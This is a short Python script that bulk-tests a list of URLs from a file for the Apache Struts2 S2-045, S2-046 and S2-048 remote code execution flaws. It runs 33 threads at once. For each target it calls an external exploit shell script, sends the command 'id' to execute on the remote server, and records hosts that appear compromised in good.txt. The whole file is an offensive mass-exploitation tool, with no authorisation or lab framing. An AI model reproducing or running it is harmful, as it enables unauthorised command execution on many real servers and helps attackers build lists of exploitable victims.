import pexpect
from multiprocessing.dummy import Pool as ThreadPool
from datetime import datetime

S2_DICT = {
    1: 's2-045',
    2: 's2-046',
    3: 's2-048',
}

def s2_resolve(url):
    """检测url是否含有s2漏洞

    :url: TODO
    :returns: TODO

    """
    result = {}
    for i in range(1, 4):
        child = pexpect.spawn('sh ./Struts2-exploit.sh')
        child.sendline(str(i))
        child.sendline(url)
        child.sendline('id')
        child.expect([pexpect.EOF,pexpect.TIMEOUT],0.5)
        stdout = child.before.split(b'\r\n')[-2]
        key = S2_DICT[i]
        if b'id' in stdout:
            result[key] = 'yes'
        else:
            result[key] = 'no'
    with open('good.txt', 'a+') as f:
        for key,value in result.items():
            timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
            if value == 'yes':
                f.write(f'{url} {key} {value} {timestamp}\n')
                print(f'[true] {url} {key} {value}')
            else:
                print(f'[false] {url} {key} {value}')
    return result

def good():
    good_ = -1
    for i in open('good.txt').read().split('\n'):
        good_+=1
    print('title "s2------good:%s"' % (good_))

def s2_resolve_bulk(urls):
    with ThreadPool(33) as pool:
        pool.map(s2_resolve, urls)

def main():
    urls = [line.strip() for line in open('urls.txt') if line.strip()]
    s2_resolve_bulk(urls)
    good()

if __name__ == "__main__":
    main()
